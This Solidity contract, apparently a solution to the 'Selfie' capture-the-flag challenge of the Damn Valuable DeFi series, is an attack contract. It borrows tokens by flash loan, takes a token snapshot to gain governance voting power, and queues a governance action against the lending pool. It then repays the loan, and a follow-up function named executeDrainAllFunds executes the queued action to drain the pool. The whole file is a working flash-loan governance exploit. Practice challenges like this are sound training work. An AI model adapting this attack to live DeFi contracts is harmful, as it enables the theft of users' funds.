// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";

import "hardhat/console.sol";

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256) external payable;
}

interface IDamnValuableTokenSnapshot {
    function snapshot() external returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

contract SelfieAttack {
    using Address for address;
    ISelfiePool private selfiePool;
    ISimpleGovernance private simpleGovernance;
    IDamnValuableTokenSnapshot private token;
    address private owner;
    bytes private data;

    uint256 public queueId;

    function attack(
        uint256 _borrowAmount,
        ISelfiePool _selfiePool,
        ISimpleGovernance _simpleGovernance,
        IDamnValuableTokenSnapshot _token,
        bytes memory _data
    ) public {
        selfiePool = _selfiePool;
        simpleGovernance = _simpleGovernance;
        token = _token;
        owner = msg.sender;
        data = _data;

        selfiePool.flashLoan(_borrowAmount);
    }

    function executeDrainAllFunds() public payable {
        require(queueId > 0, "Queue action is empty!");
        simpleGovernance.executeAction(queueId);
    }

    function receiveTokens(address, uint256 _amount) public {
        //Take snapshot before excute action
        token.snapshot();

        queueId = simpleGovernance.queueAction(address(selfiePool), data, 0);

        //Pay back for pool
        token.transfer(address(selfiePool), _amount);
    }
}
